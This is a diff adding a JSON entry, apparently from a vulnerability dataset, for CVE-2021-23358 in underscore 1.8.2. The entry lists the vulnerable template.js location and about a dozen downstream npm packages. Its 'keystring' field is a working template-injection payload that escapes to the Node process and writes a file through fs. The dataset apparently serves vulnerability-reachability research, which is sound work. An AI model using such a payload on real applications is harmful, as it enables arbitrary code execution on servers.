@@ -1,0 +1,20 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.8.2",
+  "keymethod": "variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "log4js@0.6.27",
+    "noflo@0.5.14",
+    "everlive-sdk@1.9.4",
+    "onscribe@0.4.0",
+    "banyan@0.0.1",
+    "avoscloud-code@0.10.0",
+    "jsreport@0.3.0",
+    "cassandra-store@1.0.0",
+    "node-opcua@0.0.44",
+    "react-ui-builder@0.2.10",
+    "@molgenis/core-ui@0.2.4"
+  ]
+}
